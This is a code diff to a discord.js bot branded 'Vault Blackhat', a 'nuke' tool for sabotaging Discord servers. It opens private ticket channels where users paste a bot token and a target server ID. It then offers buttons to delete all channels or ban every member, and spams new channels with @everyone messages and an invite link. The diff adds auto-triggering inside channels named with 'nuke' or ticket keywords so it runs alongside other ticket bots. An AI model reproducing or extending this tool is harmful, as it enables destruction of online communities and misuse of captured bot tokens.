@@ -1,7 +1,7 @@
 const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, ChannelType } = require('discord.js');
 const http = require('http');
 
-const TOKEN = process.env.TOKEN; // تأكد إنك حاطط التوكن هنا أو بالـ Environment
+const TOKEN = process.env.TOKEN;
 
 const client = new Client({
     intents: [
@@ -18,13 +18,35 @@ client.once('ready', () => {
 
 const ticketsData = new Map();
 
+// رسالة التكت الموحدة
+function getTicketEmbed(user) {
+    return new EmbedBuilder()
+        .setAuthor({ name: `@${user.username} Welcome`, iconURL: user.displayAvatarURL() })
+        .setDescription("أهلاً بك في تكت **الجحفلة**.\n\n1. ضع **توكن البوت** (رسالة لحالها)\n2. ضع **ايدي السيرفر** (رسالة لحالها)\n\nبعدها اختر نوع التخريب:")
+        .setColor(0xFF0000)
+        .setFooter({ text: 'Vault Blackhat' });
+}
+
+// أزرار التكت
+function getTicketButtons() {
+    return new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId('action_delete_channels').setLabel('حذف الرومات').setStyle(ButtonStyle.Danger).setEmoji('🗑️'),
+        new ButtonBuilder().setCustomId('action_ban_all').setLabel('طرد الكل').setStyle(ButtonStyle.Danger).setEmoji('🔨'),
+        new ButtonBuilder().setCustomId('close_ticket').setLabel('إغلاق').setEmoji('🔒').setStyle(ButtonStyle.Secondary)
+    );
+}
+
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
     const content = message.content.toLowerCase().trim();
-    
-    // 1. فتح التكت
+    const channelName = message.channel.name ? message.channel.name.toLowerCase() : '';
+
+    // 1. فتح تكت جديد بكلمة "جحفلة" أو "nuke" بالشات
     if (content === 'جحفلة' || content === 'nuke') {
+        // تأكد إنه ما في تكت مفتوح لنفس الشخص عشان ما يسبام
+        if (ticketsData.has(message.channel.id)) return; 
+
         await message.reply("⏳ جاري فتح تكت الجحفلة...").catch(()=>{});
 
         const user = message.author;
@@ -32,7 +54,7 @@ client.on('messageCreate', async (message) => {
 
         try {
             const ticketChannel = await guild.channels.create({
-                name: `nuke-${user.username}`,
+                name: `جحفلة-${user.username}`,
                 type: ChannelType.GuildText,
                 permissionOverwrites: [
                     { id: guild.id, deny: [PermissionFlagsBits.ViewChannel] },
@@ -40,19 +62,11 @@ client.on('messageCreate', async (message) => {
                 ],
             });
 
-            const embed = new EmbedBuilder()
-                .setAuthor({ name: `@${user.username} Welcome`, iconURL: user.displayAvatarURL() })
-                .setDescription("أهلاً بك في تكت **الجحفلة**.\n\n1. ضع **توكن البوت** (رسالة لحالها)\n2. ضع **ايدي السيرفر** (رسالة لحالها)\n\nبعدها اختر نوع التخريب:")
-                .setColor(0xFF0000)
-                .setFooter({ text: 'Vault Blackhat' });
-
-            const actionRow = new ActionRowBuilder().addComponents(
-                new ButtonBuilder().setCustomId('action_delete_channels').setLabel('حذف الرومات').setStyle(ButtonStyle.Danger).setEmoji('🗑️'),
-                new ButtonBuilder().setCustomId('action_ban_all').setLabel('طرد الكل').setStyle(ButtonStyle.Danger).setEmoji('🔨'),
-                new ButtonBuilder().setCustomId('close_ticket').setLabel('إغلاق').setEmoji('🔒').setStyle(ButtonStyle.Secondary)
-            );
-
-            await ticketChannel.send({ content: `${user}`, embeds: [embed], components: [actionRow] });
+            await ticketChannel.send({ 
+                content: `${user}`, 
+                embeds: [getTicketEmbed(user)], 
+                components: [getTicketButtons()] 
+            });
 
             ticketsData.set(ticketChannel.id, { userId: user.id, token: null, guildId: null });
 
@@ -63,7 +77,21 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // 2. قراءة التوكن والايدي
+    // 2. إذا كان الروم اسمه فيه "جحفلة" أو "nuke" أو "تكت" (عشان يشتغل ببوتات التكتات التانية)
+    if ((channelName.includes('جحفلة') || channelName.includes('nuke') || channelName.includes('تكت')) && !ticketsData.has(message.channel.id)) {
+        // عشان ما يبعت الرسالة كل مرة حد يكتب، نفحص إذا هو أول شخص
+        // بنبعت الـ Embed تلقائياً
+        try {
+            await message.channel.send({ 
+                embeds: [getTicketEmbed(message.author)], 
+                components: [getTicketButtons()] 
+            });
+            ticketsData.set(message.channel.id, { userId: message.author.id, token: null, guildId: null });
+        } catch (e) {}
+        return;
+    }
+
+    // 3. قراءة التوكن والايدي
     if (ticketsData.has(message.channel.id)) {
         const data = ticketsData.get(message.channel.id);
         
@@ -123,7 +151,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
             // سبام
             for (let i = 0; i < 10; i++) {
-                const newChannel = await targetGuild.channels.create({ name: 'nuked-by-hero-ninja', type: ChannelType.GuildText }).catch(()=>null);
+                const newChannel = await targetGuild.channels.create({ name: 'جحفلة-hero-ninja', type: ChannelType.GuildText }).catch(()=>null);
                 if (newChannel) {
                     for (let j = 0; j < 5; j++) {
                         await newChannel.send("@everyone **تم الجحفلة بواسطة HeRo - Ninja** 💀\n\nhttps://discord.gg/197").catch(()=>{});
